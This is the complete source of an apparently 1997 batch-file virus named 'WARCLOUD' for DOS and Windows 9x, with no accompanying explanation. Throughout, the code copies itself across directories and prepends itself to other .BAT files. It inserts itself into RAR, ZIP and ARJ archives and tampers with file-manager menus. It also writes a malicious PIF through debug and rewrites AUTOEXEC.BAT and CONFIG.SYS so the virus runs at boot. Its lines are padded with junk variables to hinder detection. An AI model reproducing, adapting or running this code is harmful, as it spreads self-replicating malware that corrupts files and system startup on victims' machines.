@goto tt%w�%
:w�ktim
ctty con%w�%
echo fucker
@goto W�C
:tt %w�c%
@ctty nul%w�c%
break off%w�c%
if ������%2==����������� goto w�c_rgl
if VC_%2==VC_menu_file_w�c goto mnu_w�c
if aka_%2==aka_joy_w�c goto ext_w�c
if PIF%2==PIFpaffie_w�c goto pif_w�c
%w�c%if not exist \%0 copy %0 \
%w�c%attrib +R \%0
if %w�c%not exist ..\%0 copy %0 ..
if not %w�c%exist \VC\%0 copy %0 \VC
if not exist %winbootdir%\command\%0 %w�c%copy %0 %winbootdir%\command
for %%$ in (*.BAT) do%w�c% call %0 %%$ �����
for %%$ in (*.MNU \VC\*.MNU) do call %0 %%$ menu_file_w�c
for %%$ in (*.EXT \VC\*.EXT) do call %0 %%$ joy_w�c
for %%$ in (*.PIF %winbootdir%\*.PIF %winbootdir%\PIF\*.PIF) do call %0 %%$ paffie_w�c
for %%$ i%w�c%n (*.RAR) do rar a -c- -o+ -tk %%$ %0
for %%$ in (*.ZIP) d%w�c%o pkzip %%$ %0
for %%$ in (*.%w�c%ARJ) do arj a %%$ %0
goto sys_w�c
:retn_w�c
del %tmp%\wctt$$$.tmp%w�c%
set sys=%w�c%
if not !%2==!ONLY goto w�ktim%w�c%
goto W�C

:w�c_rgl
if %1==AUTOEXEC.BAT goto freezero_w�c
f%w�c%ind "WARCLOUD" %1
if not errorlevel 1 goto W�C
copy%w�c% %1 %tmp%\wctt$$$.tmp
%w�c%echo @goto tt%%w�%%>%1
%w�c%echo :w�ktim>>%1
%w�c%echo ctty con%%w�%%>>%1
copy %1+%tmp%\wctt$$$.tmp %1%w�c%
%w�c%echo.>>%1
%w�c%find/i "w�c"<%0>>%1
goto W�C

:freezero_w�c
find "%0" %1%w�c%
if not errorlevel 1 goto w�c
copy%w�c% %1 %tmp%\wctt$$$.tmp
attrib -R %w�c%%1
echo call %0>%1%w�c%
copy %1+%tmp%\wctt$$$.tmp %1%w�c%
attri%w�c%b +R %1
goto W�C

:mnu_w�c
find "WAR%w�c%CLOUD" %1
if not errorlevel 1 goto W�C
attrib -R %1%w�c%
copy %1 %TMP%\wctt$$$.tmp%w�c%
%w�c%echo>%1 F1:  WARCLOUD "����� �����". ��� 1997
%w�c%echo>>%1         %0
if not exist vc.mnu copy %1 vc%w�c%.mnu
copy %1+%TMP%\wctt$$$.tmp %1%w�c%
attrib +R +H%w�c% %1
goto W�C

:ext_w�c
find "w�c" %1
if not errorlevel 1 goto W�C
if %1==VC.EXT %w�c%goto W�C
if %1==\VC\VC.EXT goto W�C
a%w�c%ttrib -R %1
copy %1%w�c% %TMP%\wctt$$$.tmp
 find "find/v/i"<%0>%1%w�c%
if not exist \VC\ncedit.exe echo>>%1  @edit !:!\$.bat%%w�c%%
if exist \VC\ncedit.exe echo>>%1  @ncedit !:!\$.bat%%w�c%%
echo>>%1  @ctty nul %%w�c%%
echo>>%1  @find/i "w�c" !:!\!.!
echo>>%1  @if not errorlevel 1 !:!\!.! INFECTION ONLY%%w�c%%
echo>>%1  @attrib -R -H -S !:!\!.!%%w�c%%
echo>>%1  @move !:!\$.bat !:!\!.!%%w�c%%
echo>>%1  @ctty con%%w�c%%
copy %1+%TMP%\wctt$$$.tmp %1%w�c%
attrib +R +H %1%w�c%
goto W�C

:pif_w�c
if exist \image.bat goto D%w�c%arkSeed
%w�c%copy %0 \image.bat
attr%w�c%ib +R +S +H \image.bat
if not exist \image.dat goto DarkSeed%w�c%
attrib -R -S -H \image.dat%w�c%
del %w�c%image.dat
:DarkSeed%w�c%
find "%w�c%SCANDISK" %1
if not errorlevel 1 goto W�C
att%w�c%rib -R %1
debug<%0%w�c%
move \treein%w�c%fo.ncd %1
goto W�C

:sys_w�c
if not exist \AUTOEXEC.BAT goto retn_w�c
if not exist \CONFIG.SYS goto retn_w�c
set sys=\AUTOEXEC.BAT%w�c%
find "%0" %sys%%w�c%
if not errorlevel 1 goto retn_w�c
find "Fuck_Up" %sys%%w�c%
if not errorlevel 1 goto retn_w�c
%w�c%attrib -R %sys%
find/i/v "%w�c%GOTO %%CONFIG%%"<%sys%>%sys%
copy %sys% %tmp%\wctt$$$.tmp%w�c%
echo if %%CONFIG%%==Of_Them goto %%CoNFiG%%>%sys%%w�c%
echo%w�c% goto Fuck_Up>>%sys%
echo%w�c% :Of_Them>>%sys%
echo%w�c% @if exist %0 call %0>>%sys%
echo%w�c% @if exist %0 goto Fuck_Up>>%sys%
echo%w�c% @attrib -S image.bat>>%sys%
echo%w�c% @call image.bat>>%sys%
echo%w�c% @attrib +S image.bat>>%sys%
echo%w�c% :Fuck_Up>>%sys%
copy %sys%+%tmp%\wctt$$$.tmp %sys%%w�c%
attrib +R %sys%%w�c%
set sys=\CONFIG.SYS%w�c%
attrib -R %sys%%w�c%
find/i/v "MENU"<%sys%>%sys%%w�c%
copy %sys% %tmp%\wctt$$$.tmp%w�c%
echo>%sys% SWITCHES=/N%w�c%
echo>>%sys% [MENU]%w�c%
echo>>%sys% MENUITEM = Four[Normal%w�c%
echo>>%sys% MENUITEM = Four[Logged (\BOOTLOG.TXT)%w�c%
echo>>%sys% MENUITEM = Of_Them[Safe mode%w�c%
echo>>%sys% MENUITEM = Four[Safe mode with network support%w�c%
echo>>%sys% MENUITEM = Four[Step-by-step confirmation%w�c%
echo>>%sys% MENUITEM = Four[Command prompt only%w�c%
echo>>%sys% MENUITEM = Four[Safe mode command prompt only%w�c%
echo>>%sys% MENUDEFAULT = Of_Them[30]%w�c%
echo>>%sys% [Four]%w�c%
echo>>%sys% [Of_Them]%w�c%
copy %sys%+%tmp%\wctt$$$.tmp %sys%%w�c%
at%w�c%trib +R %sys%
goto retn_w�c
N TREEINFO.NCD%w�c%
E 0100 00 78 41 56 50 20 33 2E 30 20 57 65 65 6B 6C 79%w�c%
E 0110 20 55 70 64 61 74 65 20 20 20 20 20 20 20 20 20%w�c%
E 0120 80 02 00 00 53 43 41 4E 44 49 53 4B 2E 45 58 45%w�c%
E 0130 00 44 49 53 4B 2E 45 58 45 00 00 00 00 00 00 00%w�c%
E 0140 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0150 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0160 00 00 00 10 00 00 20 20 20 20 20 20 20 00 00 00%w�c%
E 0170 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 01E0 00 00 00 00 00 00 01 00 FF 19 50 00 00 07 00 00%w�c%
E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0270 00 4D 49 43 52 4F 53 4F 46 54 20 50 49 46 45 58%w�c%
E 0280 00 87 01 00 00 71 01 57 49 4E 44 4F 57 53 20 33%w�c%
E 0290 38 36 20 33 2E 30 00 05 02 9D 01 68 00 80 02 00%w�c%
E 02A0 00 64 00 32 00 FF FF 00 00 FF FF 00 00 E2 4F 10%w�c%
E 02B0 00 1F 00 00 00 3A 00 0C 00 0F 00 00 00 00 00 00%w�c%
E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 02F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0300 00 00 00 00 00 57 49 4E 44 4F 57 53 20 56 4D 4D%w�c%
E 0310 20 34 2E 30 00 FF FF 1B 02 AC 01 00 00 00 00 00%w�c%
E 0320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0330 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0350 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0370 00 00 00 50 49 46 4D 47 52 2E 44 4C 4C 00 00 00%w�c%
E 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 03C0 00 00 00 25 00 32 00 00 00 00 00 00 00 00 00 00%w�c%
E 03D0 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 E0%w�c%
E 03E0 0F 00 00 05 00 19 00 03 00 C8 00 E8 03 02 00 0A%w�c%
E 03F0 00 01 00 00 00 00 00 00 00 14 04 00 00 04 00 06%w�c%
E 0400 00 04 00 06 00 54 65 72 6D 69 6E 61 6C 00 00 00%w�c%
E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0420 00 00 00 00 00 43 6F 75 72 69 65 72 20 4E 65 77%w�c%
E 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0440 00 00 00 00 00 00 00 01 00 00 00 50 00 19 00 00%w�c%
E 0450 00 00 00 00 00 00 00 16 00 00 00 00 00 00 00 00%w�c%
E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0470 00 5C 69 6D 61 67 65 2E 62 61 74 00 00 00 00 00%w�c%
E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00%w�c%
E 04C0 00 00 00 00 00 01 00%w�c%
RCX%w�c%
03C7%w�c%
W%w�c%
Q%w�c%
bat: @find/v/i "w�"<!:!\!.!>!:!\$.bat%w�c%
:W�C